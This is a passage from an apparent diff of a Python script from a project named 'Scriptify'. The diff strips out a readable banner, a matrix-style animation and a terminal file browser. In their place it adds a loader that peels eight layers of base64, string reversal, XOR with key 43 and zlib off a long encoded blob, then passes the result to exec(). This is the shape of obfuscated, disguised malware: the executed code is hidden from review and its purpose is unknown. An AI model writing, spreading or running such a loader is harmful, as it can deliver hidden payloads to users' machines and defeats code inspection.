HKzkzV3VoblpsMVdjY1pHZmt0aEVTaG5VbTluVEQxWFVsTjNYQzUzVzVGVWNkVldHOU4zWDRKM2NIdGhaN2xuUktsQlIrcFVXK1pFZm1sSEdnWjBSL0ZIR2NseFpTVm1HbWRVYXRWV1hBNTJUYjBIZmxsMVc5WjJVeE5uVFJOaFVQZDJYR2xuUVA1V2U='
+key = 43
+
+try:
+    # Reverse order of encryption
+    # Layer 8: Base64 decode
+    layer7 = b64d(data)
     
-    ascii_art = pyfiglet.figlet_format("Scriptify", font="slant")
-    lines = ascii_art.split('\n')
-    colours = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
+    # Layer 7: Reverse
+    layer6 = rev(layer7)
     
-    print("\n" + colored("="*60, "cyan", attrs=["bold"]))
-    print(colored("🌟 WELCOME TO SCRIPTIFY 🌟", "cyan", attrs=["bold"]))
-    print(colored("="*60, "cyan", attrs=["bold"]) + "\n")
+    # Layer 6: XOR decrypt
+    layer5 = xor_dec(layer6, key)
     
-    for line in lines:
-        if line.strip():
-            coloured_line = ""
-            for char in line:
-                if char != ' ':
-                    colour = random.choice(colours)
-                    coloured_line += colored(char, colour, attrs=["bold"])
-                else:
-                    coloured_line += char
-            print(coloured_line)
-            time.sleep(0.01)
+    # Layer 5: Base64 decode
+    layer4 = b64d(layer5)
     
-    print("\n" + colored("="*60, "cyan", attrs=["bold"]))
-    print(colored("📢 JOIN US: https://t.me/Scriptify1", "yellow", attrs=["bold"]))
-    print(colored("="*60, "cyan", attrs=["bold"]) + "\n")
-
-# ========== HACKER ANIMATION ==========
-class HackerAnimation:
-    def __init__(self):
-        self.symbols = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 
-                        'A', 'B', 'C', 'D', 'E', 'F']
-
-    def clear_screen(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
-
-    def full_screen_animation(self, duration=8):
-        """Full screen hacker animation with matrix rain"""
-        self.clear_screen()
-        start_time = time.time()
-        
-        try:
-            cols = os.get_terminal_size().columns
-            lines = os.get_terminal_size().lines
-        except:
-            cols = 80
-            lines = 24
-        
-        drops = []
-        for _ in range(int(cols * 0.4)):
-            drops.append({
-                'x': random.randint(0, cols - 1),
-                'y': random.randint(-lines, 0),
-                'speed': random.randint(1, 3),
-                'length': random.randint(5, 15)
-            })
-        
-        while time.time() - start_time < duration:
-            sys.stdout.write('\033[2J\033[H')
-            
-            for y in range(lines):
-                line_chars = []
-                for x in range(cols):
-                    char = ' '
-                    for drop in drops:
-                        if drop['x'] == x and drop['y'] <= y < drop['y'] + drop['length']:
-                            if y == drop['y'] + drop['length'] - 1:
-                                char = colored(random.choice(self.symbols), 'white', attrs=['bold'])
-                            else:
-                                char = colored(random.choice(self.symbols), 'green')
-                            break
-                    line_chars.append(char)
-                print(''.join(line_chars))
-            
-            for drop in drops:
-                drop['y'] += drop['speed']
-                if drop['y'] > lines:
-                    drop['y'] = random.randint(-20, -5)
-                    drop['x'] = random.randint(0, cols - 1)
-                    drop['length'] = random.randint(5, 15)
-                    drop['speed'] = random.randint(1, 3)
-            
-            time.sleep(0.05)
-
-# ========== SCRIPTIFY BROWSER ==========
-class ScriptifyBrowser:
-    def __init__(self):
-        self.current_path = os.path.dirname(os.path.abspath(__file__))
-        self.items = []
-        self.history = []
-        
-    def clear_screen(self):
-        os.system('clear' if os.name == 'posix' else 'cls')
-
-    def get_items(self):
-        """Get all items in current directory"""
-        self.items = []
-        try:
-            items = os.listdir(self.current_path)
-            for item in items:
-                if not item.startswith('.'):
-                    item_path = os.path.join(self.current_path, item)
-                    is_dir = os.path.isdir(item_path)
-                    self.items.append({
-                        'name': item,
-                        'path': item_path,
-                        'is_dir': is_dir,
-                        'extension': os.path.splitext(item)[1].lower() if not is_dir else ''
-                    })
-            self.items.sort(key=lambda x: (not x['is_dir'], x['name'].lower()))
-        except Exception as e:
-            pass
-
-    def display_items(self):
-        """Display items with colorful formatting - clean display"""
-        self.clear_screen()
-        show_scriptify_banner()
-        
-        if not self.items:
-            print(colored("  ❌ No items found", "red", attrs=["bold"]))
-            return
-        
-        for i, item in enumerate(self.items, 1):
-            colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white']
-            color = colors[i % len(colors)]
-            name = item['name']
-            
-            if item['is_dir']:
-                icon = colored("📁", color)
-            else:
-                icon = colored("📄", color)
-            
-            name_display = colored(f"{icon} {name}", color, attrs=["bold"])
-            num_color = ['green', 'cyan', 'yellow', 'magenta'][i % 4]
-            print(f"  {colored(str(i).zfill(2), num_color, attrs=['bold'])}. {name_display}")
-            time.sleep(0.02)
-        
-        print("\n" + colored("─"*50, "cyan"))
-        print(colored("  [0] Back  [q] Quit", "yellow", attrs=["bold"]))
-
-    def execute_file(self, file_path, extension, filename):
-        """Execute file based on extension - completely independent"""
-        try:
-            if extension == '.py':
-                print(colored(f"\n  🚀 Executing: ", "cyan", attrs=["bold"]) + 
-                      colored(f"python {filename}", "green", attrs=["bold"]))
-                print(colored("  " + "─"*40, "cyan"))
-                python_cmd = 'python3' if shutil.which('python3') else 'python'
-                
-                # Run completely independent - let it take over the terminal
-                subprocess.call([python_cmd, file_path])
-                return True
-                
-            elif extension == '.php':
-                print(colored(f"\n  🚀 Executing: ", "cyan", attrs=["bold"]) + 
-                      colored(f"php {filename}", "magenta", attrs=["bold"]))
-                print(colored("  " + "─"*40, "cyan"))
-                if shutil.which('php'):
-                    subprocess.call(['php', file_path])
-                    return True
-                else:
-                    print(colored("\n  ⚠️ PHP is not installed!", "yellow", attrs=["bold"]))
-                    return False
-                    
-            elif extension in ['.sh', '.bash']:
-                print(colored(f"\n  🚀 Executing: ", "cyan", attrs=["bold"]) + 
-                      colored(f"bash {filename}", "red", attrs=["bold"]))
-                print(colored("  " + "─"*40, "cyan"))
-                subprocess.call(['bash', file_path])
-                return True
-                
-            elif extension in ['.html', '.htm']:
-                print(colored(f"\n  🌐 Opening: ", "cyan", attrs=["bold"]) + 
-                      colored(f"{filename}", "blue", attrs=["bold"]))
-                if platform.system() == 'Windows':
-                    os.startfile(file_path)
-                elif platform.system() == 'Darwin':
-                    subprocess.Popen(['open', file_path])
-                else:
-                    subprocess.Popen(['xdg-open', file_path])
-                return True
-                
-            else:
-                print(colored(f"\n  📂 Opening: ", "cyan", attrs=["bold"]) + 
-                      colored(f"{filename}", "white", attrs=["bold"]))
-                if platform.system() == 'Windows':
-                    os.startfile(file_path)
-                elif platform.system() == 'Darwin':
-                    subprocess.Popen(['open', file_path])
-                else:
-                    subprocess.Popen(['xdg-open', file_path])
-                return True
-                
-        except Exception as e:
-            print(colored(f"\n  ❌ Error: {e}", "red", attrs=["bold"]))
-            return False
-
-    def navigate_to_item(self, index):
-        """Navigate to or execute selected item"""
-        if 1 <= index <= len(self.items):
-            item = self.items[index - 1]
-            if item['is_dir']:
-                try:
-                    self.history.append(self.current_path)
-                    os.chdir(item['path'])
-                    self.current_path = os.getcwd()
-                    return True
-                except Exception as e:
-                    print(colored(f"\n  ❌ Error: {e}", "red", attrs=["bold"]))
-                    time.sleep(1)
-                    return False
-            else:
-                return self.execute_file(item['path'], item['extension'], item['name'])
-        return False
-
-    def go_back(self):
-        """Go to parent directory"""
-        if self.history:
-            parent = self.history.pop()
-            try:
-                os.chdir(parent)
-                self.current_path = os.getcwd()
-                return True
-            except:
-                pass
-        else:
-            parent = os.path.dirname(self.current_path)
-            if parent != self.current_path:
-                try:
-                    os.chdir(parent)
-                    self.current_path = os.getcwd()
-                    return True
-                except:
-                    pass
-        return False
-
-    def run(self):
-        """Main loop"""
-        try:
-            while True:
-                self.get_items()
-                self.display_items()
-                
-                print()
-                print(colored("  ╔═══ Enter selection ═══╗", "yellow", attrs=["bold"]))
-                print(colored("  ║ → ", "yellow", attrs=["bold"]), end='')
-                
-                choice = input().strip()
-                
-                if choice.lower() == 'q':
-                    print(colored("\n  👋 Goodbye!", "green", attrs=["bold"]))
-                    break
-                
-                if choice == '0':
-                    if self.go_back():
-                        continue
-                    else:
-                        print(colored("\n  ❌ Already at root", "red", attrs=["bold"]))
-                        time.sleep(1)
-                        continue
-                
-                try:
-                    index = int(choice)
-                    if self.navigate_to_item(index):
-                        if self.items[index-1]['is_dir']:
-                            continue
-                        else:
-                            print()
-                            input(colored("  Press Enter to continue...", "yellow", attrs=["bold"]))
-                            continue
-                    else:
-                        print(colored("\n  ❌ Invalid!", "red", attrs=["bold"]))
-                        time.sleep(1)
-                except ValueError:
-                    if choice:
-                        print(colored("\n  ❌ Enter number, 0 back, q quit", "red", attrs=["bold"]))
-                        time.sleep(1)
-                
-        except KeyboardInterrupt:
-            print(colored("\n\n  👋 Goodbye!", "green", attrs=["bold"]))
-            sys.exit(0)
-
-# ========== MAIN ==========
-def main():
-    # Run animation only once at start
-    animation = HackerAnimation()
-    animation.full_screen_animation(duration=8)
+    # Layer 4: Reverse
+    layer3 = rev(layer4)
     
-    # Run browser
-    browser = ScriptifyBrowser()
-    browser.run()
-
-if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print(colored("\n\n👋 Goodbye!", "green", attrs=["bold"]))
-        sys.exit(0)
+    # Layer 3: zlib decompress + Base64 decode
+    layer2 = decompress(layer3)
+    
+    # Layer 2: Base64 decode
+    layer1 = b64d(layer2)
+    
+    # Layer 1: Reverse (original)
+    original = rev(layer1)
+    
+    # Execute
+    exec(original)
+    
+except Exception as e:
+    print(f"❌ Decryption Failed: {e}")
+    sys.exit(1)
